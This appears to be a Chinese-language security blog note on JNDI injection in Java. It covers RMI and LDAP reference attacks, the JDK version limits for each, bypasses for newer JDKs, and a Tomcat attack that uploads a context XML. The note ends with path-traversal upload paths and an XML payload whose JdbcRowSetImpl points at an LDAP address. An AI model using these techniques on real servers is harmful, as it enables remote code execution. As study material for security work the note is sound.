---
title: JNDI注入
date: 2026-03-11 08:51:15
updated: 2026-05-24 14:20:09
tags:
  - Web
  - java
  - 反序列化
---
[探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖](https://tttang.com/archive/1405/)

# 通过RMI绑定远程对象（限制较多，不常使用）

将RMI远程对象并绑定到RMI Registry上，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象。

利用条件：

1、RMI客户端的上下文环境允许访问远程Codebase。

2、JDK 6u45、7u21之前（系统属性java.rmi.server.useCodebaseOnly限制远程codebase加载）

# JNDI+RMI

攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类。

利用条件：

1、JDK 6u132, JDK 7u122, JDK 8u113 之前（系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase限制从远程的Codebase加载Factory类）

# JNDI+LDAP

攻击者通过LDAP服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类。

利用条件：

JDK 8u191、7u201、6u211之前（系统属性com.sun.jndi.ldap.object.trustURLCodebase限制从远程的Codebase加载Factory类 ）

# 绕过JDK 8u191+等高版本trustURLCodebase限制

## JNDI+Reference+本地工厂类

找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。这个Factory类必须实现 javax.naming.spi.ObjectFactory 接口。

当前已有的通用方式都是通过org.apache.naming.factory.BeanFactory这个存在于Tomcat依赖包中的工厂类，去反射构造代码执行。

## JNDI+LDAP反序列化(不使用Reference机制)

利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。利用限制就是需要本地有反序列化Gadget。

## 利用其他协议：

除了RMI和LDAP之外，攻击者还可能尝试利用其他协议（如DNS、HTTP等）来绕过JNDI漏洞的防护。例如，通过构造恶意的DNS查询来触发JNDI注入攻击

# 利用 Tomcat XML 配置机制实现 JNDI 注入

> 需要符合以下利用条件：
> 
> ① Tomcat环境
> 
> ② 存在任意跨目录文件上传
> 
> ③ 允许上传xml后缀文件

tomcat路径/conf/Catalina/localhost/xx.xml

../../conf/Catalina/localhost/xx.xml

linux下：../../../../../../../../../../proc/self/cwd/../conf/Catalina/localhost/xx.xml

```xml
<?xml version='1.0' encoding='utf-8'?>
<Context>
  <Manager className="com.sun.rowset.JdbcRowSetImpl"
    dataSourceName="ldap://127.0.0.1:50389/5954db"
    autoCommit="true"></Manager>
</Context>
```
